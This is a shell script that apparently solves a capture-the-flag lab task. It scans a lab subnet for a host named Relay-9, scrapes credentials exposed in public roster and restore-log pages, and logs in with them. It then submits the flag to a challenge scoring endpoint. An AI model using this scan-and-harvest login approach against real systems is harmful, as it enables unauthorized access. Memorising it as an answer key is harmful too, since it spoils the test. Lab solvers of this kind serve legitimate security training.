#!/bin/sh
set -eu

TARGET_IP="$(nmap -n -p 80 --open -oG - 172.20.0.0/24 | awk '$2 == "172.20.0.141" { print $2; exit }')"
if [ -z "$TARGET_IP" ]; then
  echo "Relay-9 was not found on the lab network." >&2
  exit 1
fi
BASE="http://${TARGET_IP}"

HOME_PAGE="$(curl -fsS "$BASE/")"
ROSTER_PATH="$(printf '%s' "$HOME_PAGE" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"href=[\"\x27]([^\"\x27]*roster)[\"\x27]", s); print(m.group(1) if m else "")')"
RECORD_PATH="$(printf '%s' "$HOME_PAGE" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"href=[\"\x27]([^\"\x27]*restore\.log)[\"\x27]", s); print(m.group(1) if m else "")')"
if [ -z "$ROSTER_PATH" ] || [ -z "$RECORD_PATH" ]; then
  echo "The board's public records could not be located." >&2
  exit 1
fi

ROSTER="$(curl -fsS "$BASE$ROSTER_PATH")"
RECORD="$(curl -fsS "$BASE$RECORD_PATH")"
CREDS="$(printf '%s\n---RECORD---\n%s' "$ROSTER" "$RECORD" | python3 -c '
import html,re,sys
s=sys.stdin.read()
parts=s.split("---RECORD---",1)
if len(parts) != 2: raise SystemExit("Could not separate board records")
roster,record=parts
m=re.search(r"Accepted principal:\s*([A-Za-z0-9_-]+)", record)
if not m: raise SystemExit("No accepted principal in restoration record")
user=m.group(1)
for item in re.findall(r"<code>([^<]+)</code>", roster):
    pair=html.unescape(item).split(":",1)
    if len(pair)==2 and pair[0]==user:
        print(pair[0])
        print(pair[1])
        break
else:
    raise SystemExit("No matching roster credential")
')"
USER_NAME="$(printf '%s\n' "$CREDS" | sed -n '1p')"
PASSWORD="$(printf '%s\n' "$CREDS" | sed -n '2p')"
LOGIN_RESPONSE="$(curl -fsS -X POST "$BASE/login" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "username=$USER_NAME" --data-urlencode "password=$PASSWORD")"
FLAG_VALUE="$(printf '%s' "$LOGIN_RESPONSE" | python3 -c 'import json,sys; print(json.load(sys.stdin)["flag"])')"

FLAG_VALUE="$FLAG_VALUE" python3 -c 'import json,os; print(json.dumps({"challenge_id":"scl-challenge-frame-0a220a","task_id":"task1","flag":os.environ["FLAG_VALUE"]}))' | \
  curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-